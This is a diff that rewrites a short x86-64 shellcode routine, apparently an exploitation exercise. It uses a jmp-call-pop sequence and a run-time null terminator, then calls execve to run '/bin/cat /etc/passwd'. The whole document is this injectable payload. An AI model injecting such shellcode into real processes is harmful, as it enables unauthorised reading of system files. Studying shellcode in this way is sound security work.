@@ -3,25 +3,29 @@
 _start:
         jmp caller
 callee:
+        pop rsi
+        xor rcx, rcx
+        mov cl, [rsi]
+        inc rsi
+        mov rbx, rsi
+        cld
+        rep lodsb
+        mov [rsi], cl
+main:
+        push 59
         pop rax
-        xor rdx, rdx
-        lea rsi, [rax+1]
-        movzx rcx, byte ptr [rax]
-        add rcx, rsi
-        mov [rcx], dl
+        cqo
+        movabs rdi, 0x7461632f6e69622f
         push rdx
-        mov rax, 0x7461632f6e69622f  /* "/bin/cat" */
-        push rax
+        push rdi
         mov rdi, rsp
         push rdx
-        push rsi
+        push rbx
         push rdi
         mov rsi, rsp
-        push 59                      /* execve */
-        pop rax
         syscall
 caller:
         call callee
-pstring:
+arg:
         .byte 11
         .ascii "/etc/passwd"
